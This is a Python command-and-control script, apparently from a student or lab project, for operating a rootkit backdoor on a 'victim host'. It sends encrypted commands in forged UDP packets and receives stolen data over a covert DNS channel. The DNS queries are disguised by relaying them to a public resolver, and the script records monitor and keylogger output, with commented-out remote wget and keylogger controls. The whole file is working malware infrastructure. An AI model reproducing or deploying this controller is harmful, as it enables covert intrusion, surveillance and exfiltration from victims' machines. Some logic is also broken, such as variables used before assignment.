"""
    This is the backdoor controller program.
    It allows you to control the backdoor on a victim host
    by sending it different commands over a network.
"""

# Ignore warnings
from warnings import filterwarnings
filterwarnings("ignore")

# Standard Library Modules
import argparse
from multiprocessing import Process, SimpleQueue
from ipaddress import ip_address, IPv6Address
from sys import exit
from time import sleep

# Custom Modules
from utils.shell import *
from utils.encryption import *
from utils.validation import validate_ipv4_address, validate_nic_interface

# Third Party Libraries
from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS, conf

# Command Line Arguments
PARSER = argparse.ArgumentParser("./main.py")
PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host")
PARSER.add_argument("rootkit_ip", help="The IPv4 address of the rootkit host.")
PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
ARGS = PARSER.parse_args()

# Manually set scapy to use libpcap.
conf.use_pcap = True

# Validate Arguments
if not validate_ipv4_address(ARGS.controller_ip):
    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
    exit(1)

if not validate_ipv4_address(ARGS.rootkit_ip):
    print(f"Invalid IPv4 Address: '{ARGS.rootkit_ip}'")
    exit(1)

if not validate_nic_interface(ARGS.interface):
    print(f"Network Interface does not exist: '{ARGS.interface}'")
    exit(1)


# Global Variables
CONTROLLER_IP = ARGS.controller_ip
ROOTKIT_IP = ARGS.rootkit_ip
NETWORK_INTERFACE = ARGS.interface
QUEUE = SimpleQueue()
STREAM_ENCRYPTION_HANDLER = StreamEncryption()
BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
MONITOR_IDENTIFICATION = 14562
KEYLOG_IDENTIFICATION = 32586
GENERAL_MSG_IDENTIFICATION = 19375


# Initialize the encryption context.
STREAM_ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
STREAM_ENCRYPTION_HANDLER.read_secret("data/secret.key")
STREAM_ENCRYPTION_HANDLER.initialize_encryption_context()
BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")


def subprocess_packet_handler(pkt):
    """
    
    """
    if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
        return None
    if pkt[IP].id == GENERAL_MSG_IDENTIFICATION:
        # 1. Get the data in the TXT record.
        encrypted_message = pkt[UDP].ar.rdata[0]
        # 2. Put the data in the queue.
        QUEUE.put(encrypted_message)
        # 3. Craft a legit query.
        forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
        # 4. sr1 the DNS query to a legit DNS server.
        response = sr1(forged, verbose=0)
        # 5. send the response back to the backdoor machine.
        response[IP].src = f"{CONTROLLER_IP}"
        response[IP].dst = f"{ROOTKIT_IP}"
        send(response, verbose=0)
    if pkt[IP].id == KEYLOG_IDENTIFICATION:
        write_keylog_data(encrypted_message)
    if pkt[IP].id == MONITOR_IDENTIFICATION:
        write_monitor_data(encrypted_message)

def write_keylog_data(data):
    pass

def write_monitor_data(data):
    b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
    msg = b.decode("utf-8")
    with open("logs/monitor.log", "w") as f:
        f.write(msg + "\n")

def subprocess_start():
    """
    """
    sniff(filter=f"ip src host {ROOTKIT_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)


def send_udp(data: str):
    """
        Sends a UDP packet to the backdoor which is supposed to contain a command.
        All commands get sent to a specific UDP port on the backdoor machine.
        The UDP packet that is sent contains the encrypted command in the payload
        section. The backdoor machine listens for a specific port to know that
        the UDP packet is ours.
    """
    data = data.encode("utf-8")
    # Encrypt the data.
    data = STREAM_ENCRYPTION_HANDLER.encrypt(data)
    # Forge the UDP packet.
    pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{ROOTKIT_IP}")/UDP(sport=10069, dport=10420, len=len(data))
    pkt[UDP].payload = Raw(data)
    # Send the packet.
    send(pkt, verbose=0)


def receive_single_response():
    attempts = 0
    while attempts < 3:
        if QUEUE.empty():
            attempts += 1
            sleep(1)
            continue
        else:
            encrypted = QUEUE.get()
            decrypted = STREAM_ENCRYPTION_HANDLER.decrypt(encrypted)
            print(f"Response: {decrypted.decode('utf-8')}")
            return
    print("Timed out waiting for response...")


if __name__ == "__main__":

    # Start the secondary process which sniffs for DNS requests from the backdoor,
    # decodes the attached information, and forwards the DNS request to a legitimate server,
    # then forwards the legitmate response back to the backdoor.
    decode_process = Process(target=subprocess_start)
    decode_process.start()

    # Interactive Shell
    print_menu()
    while True:
        try:
            command = input("λ: ")
        except KeyboardInterrupt:
            break
        argv = command.split(" ")
        argc = len(argv)
        if argc == 1:
            if command == HELP:
                print_help()
                continue
            elif command == CLEAR:
                clear_screen()
                continue
            elif command == EXIT:
                break
        if argc == 2:
            data = argv[0] + " " + argv[1]
            # if argv[0] == LIST:
            #     send_udp(data)
            #     receive_single_response()
            #     continue
            # if argv[0] == KEYLOGGER:
            #     if argv[1] in [START, STOP, TRANSFER]:
            #         send_udp(data)
            #     continue
            if argv[0] == WATCH:
                send_udp(data)
                receive_single_response()
                continue
        # if argc == 3:
        #     if argv[0] == WGET:
        #         url = argv[1]
        #         filepath = argv[2]
        #         data = argv[0] + " " + argv[1] + " " + argv[2]
        #         send_udp(data)
        #         receive_single_response()
        #         continue
        else:
            print(f"Invalid Command: {command}")
    decode_process.kill()
